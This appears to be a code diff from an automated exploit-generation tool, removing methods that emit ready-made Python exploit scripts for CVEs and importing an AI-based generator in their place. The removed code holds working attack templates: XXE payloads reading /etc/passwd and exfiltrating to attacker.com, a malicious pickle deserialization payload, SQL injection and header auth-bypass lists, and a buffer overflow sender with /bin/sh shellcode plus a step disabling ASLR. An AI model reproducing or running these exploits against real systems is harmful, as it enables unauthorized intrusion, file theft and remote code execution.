-    def _generate_xxe_exploit(self, cve_data, target_info, details):
-        """Generate XXE exploit based on CVE details"""
-        cve_id = cve_data.get("cve_id", "")
-        
-        return f'''#!/usr/bin/env python3
-# XXE (XML External Entity) Exploit for {cve_id}
-# Vulnerability: {cve_data.get("description", "")[:100]}...
-
-import requests
-import sys
-
-class XXEExploit:
-    def __init__(self, target_url):
-        self.target_url = target_url.rstrip('/')
-        self.session = requests.Session()
-        
-    def generate_xxe_payloads(self):
-        """Generate XXE payloads"""
-        payloads = [
-            # Basic file read
-            '<?xml version="1.0" encoding="UTF-8"?>\\n<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\\n<root>&xxe;</root>',
-            
-            # Windows file read
-            '<?xml version="1.0" encoding="UTF-8"?>\\n<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///C:/windows/system32/drivers/etc/hosts">]>\\n<root>&xxe;</root>',
-            
-            # HTTP request (SSRF)
-            '<?xml version="1.0" encoding="UTF-8"?>\\n<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]>\\n<root>&xxe;</root>',
-            
-            # Parameter entity
-            '<?xml version="1.0" encoding="UTF-8"?>\\n<!DOCTYPE root [\\n<!ENTITY % xxe SYSTEM "file:///etc/passwd">\\n<!ENTITY % param1 "<!ENTITY exfil SYSTEM \\'http://attacker.com/?%xxe;\\'>">\\n%param1;\\n]>\\n<root>&exfil;</root>'
-        ]
-        
-        return payloads
-    
-    def test_xxe(self):
-        """Test for XXE vulnerability"""
-        print("[+] Testing XXE vulnerability...")
-        
-        payloads = self.generate_xxe_payloads()
-        
-        for i, payload in enumerate(payloads):
-            try:
-                headers = {{"Content-Type": "application/xml"}}
-                response = self.session.post(
-                    self.target_url,
-                    data=payload,
-                    headers=headers
-                )
-                
-                # Check for file content indicators
-                indicators = [
-                    "root:", "daemon:", "bin:",  # /etc/passwd
-                    "localhost", "127.0.0.1",   # hosts file
-                    "<?xml", "<!DOCTYPE"        # XML processing
-                ]
-                
-                if any(indicator in response.text for indicator in indicators):
-                    print(f"[+] XXE vulnerability found with payload {{i+1}}")
-                    print(f"[+] Response: {{response.text[:200]}}...")
-                    return True
-                    
-            except Exception as e:
-                continue
-                
-        return False
-
-def main():
-    if len(sys.argv) != 2:
-        print(f"Usage: python3 {{sys.argv[0]}} <target_url>")
-        print(f"Example: python3 {{sys.argv[0]}} http://target.com/xml")
-        sys.exit(1)
-    
-    target_url = sys.argv[1]
-    exploit = XXEExploit(target_url)
-    
-    print(f"[+] XXE Exploit for {cve_id}")
-    print(f"[+] Target: {{target_url}}")
-    
-    if exploit.test_xxe():
-        print("[+] XXE vulnerability confirmed!")
-    else:
-        print("[-] No XXE vulnerability found")
-
-if __name__ == "__main__":
-    main()
-'''
-
-    def _generate_deserialization_exploit(self, cve_data, target_info, details):
-        """Generate deserialization exploit based on CVE details"""
-        cve_id = cve_data.get("cve_id", "")
-        
-        return f'''#!/usr/bin/env python3
-# Deserialization Exploit for {cve_id}
-# Vulnerability: {cve_data.get("description", "")[:100]}...
-
-import requests
-import sys
-import base64
-import pickle
-import json
-
-class DeserializationExploit:
-    def __init__(self, target_url):
-        self.target_url = target_url.rstrip('/')
-        self.session = requests.Session()
-        
-    def create_pickle_payload(self, command):
-        """Create malicious pickle payload"""
-        class ExploitPayload:
-            def __reduce__(self):
-                import subprocess
-                return (subprocess.call, ([command], ))
-        
-        payload = ExploitPayload()
-        serialized = pickle.dumps(payload)
-        encoded = base64.b64encode(serialized).decode()
-        return encoded
-    
-    def test_deserialization(self):
-        """Test for deserialization vulnerabilities"""
-        print("[+] Testing deserialization vulnerability...")
-        
-        test_command = "ping -c 1 127.0.0.1"  # Safe test command
-        
-        # Test different serialization formats
-        payloads = {{
-            "pickle": self.create_pickle_payload(test_command),
-            "json": json.dumps({{"__type__": "os.system", "command": test_command}}),
-            "java": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAF4"
-        }}
-        
-        for format_type, payload in payloads.items():
-            try:
-                # Test different parameters
-                test_params = ["data", "payload", "object", "serialized"]
-                
-                for param in test_params:
-                    response = self.session.post(
-                        self.target_url,
-                        data={{param: payload}}
-                    )
-                    
-                    # Check for deserialization indicators
-                    if response.status_code in [200, 500] and len(response.text) > 0:
-                        print(f"[+] Potential {{format_type}} deserialization found")
-                        return True
-                        
-            except Exception as e:
-                continue
-                
-        return False
-
-def main():
-    if len(sys.argv) != 2:
-        print(f"Usage: python3 {{sys.argv[0]}} <target_url>")
-        print(f"Example: python3 {{sys.argv[0]}} http://target.com/deserialize")
-        sys.exit(1)
-    
-    target_url = sys.argv[1]
-    exploit = DeserializationExploit(target_url)
-    
-    print(f"[+] Deserialization Exploit for {cve_id}")
-    print(f"[+] Target: {{target_url}}")
-    
-    if exploit.test_deserialization():
-        print("[+] Deserialization vulnerability confirmed!")
-    else:
-        print("[-] No deserialization vulnerability found")
-
-if __name__ == "__main__":
-    main()
-'''
-
-    def _generate_auth_bypass_exploit(self, cve_data, target_info, details):
-        """Generate authentication bypass exploit"""
-        cve_id = cve_data.get("cve_id", "")
-        
-        return f'''#!/usr/bin/env python3
-# Authentication Bypass Exploit for {cve_id}
-# Vulnerability: {cve_data.get("description", "")[:100]}...
-
-import requests
-import sys
-
-class AuthBypassExploit:
-    def __init__(self, target_url):
-        self.target_url = target_url.rstrip('/')
-        self.session = requests.Session()
-        
-    def test_sql_auth_bypass(self):
-        """Test SQL injection authentication bypass"""
-        print("[+] Testing SQL injection auth bypass...")
-        
-        bypass_payloads = [
-            "admin' --",
-            "admin' #",
-            "admin'/*",
-            "' or 1=1--",
-            "' or 1=1#",
-            "') or '1'='1--",
-            "admin' or '1'='1",
-        ]
-        
-        for payload in bypass_payloads:
-            try:
-                data = {{
-                    "username": payload,
-                    "password": "anything"
-                }}
-                
-                response = self.session.post(
-                    f"{{self.target_url}}/login",
-                    data=data
-                )
-                
-                # Check for successful login indicators
-                success_indicators = [
-                    "dashboard", "welcome", "logout", "admin panel",
-                    "successful", "redirect"
-                ]
-                
-                if any(indicator in response.text.lower() for indicator in success_indicators):
-                    print(f"[+] SQL injection bypass successful: {{payload}}")
-                    return True
-                    
-            except Exception as e:
-                continue
-                
-        return False
-    
-    def test_header_bypass(self):
-        """Test header-based authentication bypass"""
-        print("[+] Testing header-based auth bypass...")
-        
-        bypass_headers = [
-            {{"X-Forwarded-For": "127.0.0.1"}},
-            {{"X-Real-IP": "127.0.0.1"}},
-            {{"X-Remote-User": "admin"}},
-            {{"X-Forwarded-User": "admin"}},
-            {{"Authorization": "Bearer admin"}},
-        ]
-        
-        for headers in bypass_headers:
-            try:
-                response = self.session.get(
-                    f"{{self.target_url}}/admin",
-                    headers=headers
-                )
-                
-                if response.status_code == 200:
-                    print(f"[+] Header bypass successful: {{headers}}")
-                    return True
-                    
-            except Exception as e:
-                continue
-                
-        return False
-
-def main():
-    if len(sys.argv) != 2:
-        print(f"Usage: python3 {{sys.argv[0]}} <target_url>")
-        print(f"Example: python3 {{sys.argv[0]}} http://target.com")
-        sys.exit(1)
-    
-    target_url = sys.argv[1]
-    exploit = AuthBypassExploit(target_url)
-    
-    print(f"[+] Authentication Bypass Exploit for {cve_id}")
-    print(f"[+] Target: {{target_url}}")
-    
-    success = False
-    if exploit.test_sql_auth_bypass():
-        print("[+] SQL injection authentication bypass confirmed!")
-        success = True
-        
-    if exploit.test_header_bypass():
-        print("[+] Header-based authentication bypass confirmed!")
-        success = True
-        
-    if not success:
-        print("[-] No authentication bypass found")
-
-if __name__ == "__main__":
-    main()
-'''
-
-    def _generate_buffer_overflow_exploit(self, cve_data, target_info, details):
-        """Generate buffer overflow exploit"""
-        cve_id = cve_data.get("cve_id", "")
-        arch = target_info.get("target_arch", "x64")
-        
-        return f'''#!/usr/bin/env python3
-# Buffer Overflow Exploit for {cve_id}
-# Architecture: {arch}
-# Vulnerability: {cve_data.get("description", "")[:100]}...
-
-import struct
-import socket
-import sys
-
-class BufferOverflowExploit:
-    def __init__(self, target_host, target_port):
-        self.target_host = target_host
-        self.target_port = int(target_port)
-        
-    def create_pattern(self, length):
-        """Create cyclic pattern for offset discovery"""
-        pattern = ""
-        for i in range(length):
-            pattern += chr(65 + (i % 26))  # A-Z pattern
-        return pattern
-    
-    def generate_shellcode(self):
-        """Generate shellcode for {arch}"""
-        if "{arch}" == "x86":
-            # x86 execve("/bin/sh") shellcode
-            shellcode = (
-                "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e"
-                "\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
-            )
-        else:
-            # x64 execve("/bin/sh") shellcode
-            shellcode = (
-                "\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73"
-                "\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05"
-            )
-        
-        return shellcode.encode('latin-1')
-    
-    def create_exploit(self, offset=140):
-        """Create buffer overflow exploit"""
-        print(f"[+] Creating buffer overflow exploit...")
-        print(f"[+] Offset: {{offset}} bytes")
-        
-        # Pattern to reach return address
-        padding = "A" * offset
-        
-        if "{arch}" == "x86":
-            # x86 return address (example)
-            ret_addr = struct.pack("<I", 0x08048080)  # Adjust for target
-        else:
-            # x64 return address (example)
-            ret_addr = struct.pack("<Q", 0x0000000000401000)  # Adjust for target
-        
-        # NOP sled
-        nop_sled = "\\x90" * 16
-        
-        # Shellcode
-        shellcode = self.generate_shellcode()
-        
-        exploit = padding.encode() + ret_addr + nop_sled.encode('latin-1') + shellcode
-        
-        print(f"[+] Exploit size: {{len(exploit)}} bytes")
-        return exploit
-    
-    def send_exploit(self, payload):
-        """Send exploit to target"""
-        try:
-            print(f"[+] Connecting to {{self.target_host}}:{{self.target_port}}")
-            
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect((self.target_host, self.target_port))
-            
-            print("[+] Sending exploit...")
-            sock.send(payload)
-            
-            # Try to interact
-            try:
-                response = sock.recv(1024)
-                print(f"[+] Response: {{response}}")
-            except:
-                pass
-                
-            sock.close()
-            print("[+] Exploit sent successfully")
-            
-        except Exception as e:
-            print(f"[-] Error: {{e}}")
-
-def main():
-    if len(sys.argv) != 3:
-        print(f"Usage: python3 {{sys.argv[0]}} <target_host> <target_port>")
-        print(f"Example: python3 {{sys.argv[0]}} 192.168.1.100 9999")
-        sys.exit(1)
-    
-    target_host = sys.argv[1]
-    target_port = sys.argv[2]
-    
-    exploit = BufferOverflowExploit(target_host, target_port)
-    
-    print(f"[+] Buffer Overflow Exploit for {cve_id}")
-    print(f"[+] Target: {{target_host}}:{{target_port}}")
-    print(f"[+] Architecture: {arch}")
-    
-    # Create and send exploit
-    payload = exploit.create_exploit()
-    exploit.send_exploit(payload)
-
-if __name__ == "__main__":
-    main()
-'''
-
-    def _generate_usage_instructions(self, vuln_type, params):
-        """Generate usage instructions for the exploit"""
-        instructions = [
-            f"# Exploit for CVE {params['cve_id']}",
-            f"# Vulnerability Type: {vuln_type}",
-            "",
-            "## Usage Instructions:",
-            "1. Ensure target is vulnerable to this CVE",
-            "2. Adjust target parameters as needed",
-            "3. Test in controlled environment first",
-            "4. Execute with appropriate permissions",
-            "",
-            "## Testing:",
-            f"python3 exploit.py {params.get('target_ip', '')} {params.get('target_port', '')}"
-        ]
-
-        if vuln_type == "buffer_overflow":
-            instructions.extend([
-                "",
-                "## Buffer Overflow Notes:",
-                f"- Offset: {params.get('offset', 'Unknown')}",
-                f"- Return address: {params.get('ret_address', 'Unknown')}",
-                "- Verify addresses match target binary",
-                "- Disable ASLR for testing: echo 0 > /proc/sys/kernel/randomize_va_space"
-            ])
-
-        return "\n".join(instructions)
+from core.ai_exploit_generator import AIExploitGenerator
 
 class VulnerabilityCorrelator:
     """Correlate vulnerabilities for multi-stage attack chain discovery"""
@@ -4658,6 +3174,7 @@ class VulnerabilityCorrelator:
         ]
 
         return "\n".join(recommendations)
+
 
 # Global intelligence managers
 cve_intelligence = CVEIntelligenceManager()
